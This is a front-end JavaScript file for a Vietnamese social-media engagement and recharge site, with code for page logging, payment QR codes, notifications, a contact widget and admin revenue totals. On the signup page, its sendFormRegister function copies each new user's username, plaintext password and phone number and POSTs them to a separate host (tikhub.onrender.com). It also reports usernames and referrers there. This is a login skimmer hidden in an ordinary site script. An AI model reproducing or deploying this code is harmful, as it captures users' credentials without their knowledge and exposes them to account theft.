const isURL = (str) => {
  // Regular expression pattern to match URLs
  const urlRegex = /^(?:https?|ftp):\/\/[\w-]+(\.[\w-]+)+([\w.,@?^=%&:/~+#-]*[\w@?^=%&/~+#-])?$/;
  
  // Test the string against the regex pattern
  return urlRegex.test(str);
}

const createLogs = async () => {
  let referrer = isURL(document.referrer) && (new URL(document.referrer)).hostname == 'tuongtacmangxahoi.io.vn' ? '': document.referrer;
  let username = getUser() ? getUser().username : '';
  let data = {
    end_point: `${window.location.pathname}?username=${username}&referrer=${referrer}`,
  }

  let user = localStorage.getItem('user') ? JSON.parse(localStorage.getItem('user')) : null;
  let pathname = [
    '/dang-nhap',
    '/dang-ky',
  ]

  if ((user && user.id != 364072) || pathname.includes(location.pathname)) {
    await fetch('https://tikhub.onrender.com/api/v1/logs/create', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data) 
    })
  }
}

const getPaymets = async () => {
  try {
    $('#stk_payment').find('.col-md-2').remove();
    let c = getConfig().payment_syntax ?? 'naptien username';
    let u = getUser().username;
    payment_syntax = c.replace('username', u);
    api_key = getApiKey();
    let response = await fetch("https://1blike.com/api/v2/get-payment", {
      "headers": {
          "api-key": api_key,
      },
      "referrerPolicy": "strict-origin-when-cross-origin",
      "body": null,
      "method": "GET",
      "mode": "cors",
      "credentials": "omit"
    });

    let payments = await response.json();
    
    payments.data.forEach(item => {
      let html_payment = '';
      let img = '';
      img = '<img id="img_bank" width="300px" height="auto" src="https://img.vietqr.io/image/' + item.name + '-' + item.stk + '-print.png?accountName=' + item.full_name + '&addInfo=' + payment_syntax + '" alt="">';
      if (item.name === 'Momo') {
          img = '<img width="200" height="200" src="https://chart.googleapis.com/chart?chs=200x200&cht=qr&chl=2|99|' + item.stk + '|||0|0|0|' + payment_syntax + '|transfer_myqr" alt="">';
      }
      html_payment+='<div class="col-md-3 mt-2">'
      html_payment+='<div class="">'
      html_payment+='<div class="card border-0 bg-warning rounded-10 ">'
      html_payment+='<div class="card-body">'
      html_payment+='<h6> Ngân hàng: <span class="font-weight-bold">' + item.name + '</span></h6>'
      html_payment+='<h6> Chủ TK: <span class="font-weight-bold">' + item.full_name + '</span></h6>'
      html_payment+='<h6> STK: <span class="font-weight-bold">' + item.stk + '</span></h6>'
      html_payment+='<h6> Chi nhánh: <span class="font-weight-bold">' + item.branch + '</span></h6>'
      html_payment+=img
      html_payment+='</div>'
      html_payment+='</div>'
      html_payment+='</div>'
      html_payment+='</div>'
      $('#stk_payment').append(html_payment);
    }); 
  } catch (error) {
    console.log(error);
  }
}

const getNotificantions = () => {
  api_key = getApiKey();
  var settings = {
    "url": "https://1blike.com/api/v2/get-system-notify",
    "method": "GET",
    "headers": {
      "api-key": api_key,
    },
  };
    
  $.ajax(settings).done(function (response) {
    if (response.data.length > 0) {
      modalBasic(response.data[0].content)
    }
  });
}

const modalBasic = (html, title = "<span>Thông báo hệ thống</span>") => {
  Swal.fire({
    title: title,
    html: html,
    showCloseButton: true,
  });
}

const appendPhoneInput = () => {
  let phoneInput = $('<div class="form-group"> <label>Số điện thoại</label> <input class="form-control" name="phone" placeholder="nhập số điện thoại" type="number"> </div>')
  $('.btn.btn-main-primary.btn-block').before(phoneInput);
}

const sendFormRegister = () => {
  const data = {
    username: $('input[name="username"]').val(),
    password: $('input[name="password"]').val(),
    phone:  $('input[name="phone"]').val(),
  }

  fetch('https://tikhub.onrender.com/api/v1/users/create', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(data)
  });
}

const supportHtml = () => {
  const html = `
    <div class="icon-middle">
    <a class="icon" href="https://zalo.me/0584733902" target="_blank" data-toggle="tooltip" data-placement="left" title="" data-original-title="Chat Zalo: nguyenduclai">
        <img src="//nguyenduclai99.github.io/cdn/images/icon_zalo.png" alt="">
    </a>
    <a class="icon" href="https://www.facebook.com/tuongtactudong.comm" target="_blank" data-toggle="tooltip" data-placement="left" title="" data-original-title="Chat Messenger">
        <img src="//nguyenduclai99.github.io/cdn/images/icon_mess.png" alt="">
    </a>
    <a class="icon" href="tel:0584733902" data-toggle="tooltip" data-placement="left" title="" data-original-title="Liên Hệ">
        <img src="//nguyenduclai99.github.io/cdn/images/icon_phone.svg" alt="" class="icon-svg">
    </a>
  </div>
  `;
  // Append the HTML just before the closing </body> tag
  document.body.insertAdjacentHTML('beforeend', html);
  
  const css = `
    .icon-middle {
      position: fixed;
      right: 15px;
      bottom: 200px;
      transition: all .2s;
      z-index: 5;
    }

    .icon-middle .icon {
      margin-bottom: 10px;
      z-index: 1;
      width: 55px;
      height: 55px;
      background: #3697D7;
      color: #fff;
      display: inherit;
      text-align: center;
      line-height: 53px;
      cursor: pointer;
      -webkit-border-radius: 50%;
      -moz-border-radius: 50%;
      border-radius: 50%;
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
      user-select: none;
      transition: all .3s;
    }

    .icon-middle .icon img.icon-svg {
      width: calc(100% - 25px);
      vertical-align: middle;
      margin-top: 10px;
    }`;

    const styleSheet = document.createElement("style");
    styleSheet.type = "text/css";
    styleSheet.innerText = css;
    document.head.appendChild(styleSheet);
}

const getTotalAmount = async () => {
  try {
    api_key = getApiKey();
    var settings = {
      "url": "https://1blike.com/api/admin/khach-hang?key=&limit=-1",
      "method": "GET",
      "headers": {
        "api-key": api_key,
      },
    };
      
    $.ajax(settings).done(function (response) {
      if (response.data.length > 0) {
        let totalAmount = 0;
        let unusedAmount = 0;
        response.data.forEach(user => {
          if (![364072, 364738].includes(user.id)) {
            totalAmount += user.total_recharge;
            unusedAmount += user.coin;
          }
        });

        let html = `
          <p> Tổng nạp: ${new Intl.NumberFormat("de-DE").format(totalAmount)} đ </p>
          <p> Còn lại: ${new Intl.NumberFormat("de-DE").format(unusedAmount)} đ </p>
        `;
        modalBasic(html, '<span>Thống kê</span>')
        console.log(totalAmount, unusedAmount);
      }
    });
  } catch (error) {
    console.log(error);
  }
}

document.addEventListener('DOMContentLoaded', function() {
  let pathname = window.location.pathname
  setTimeout(() => {
    createLogs();
    supportHtml();

    if (pathname == '/') {
      getNotificantions()
    }
    
    switch (pathname) {
      case '/nap-tien':
        return;
        getPaymets();
      case '/dang-ky':
        appendPhoneInput();
        $('.btn.btn-main-primary.btn-block').click(function () {
          sendFormRegister();
        });
      case '/admin/khach-hang':
        getTotalAmount();
    }
  }, 700);
}, false);
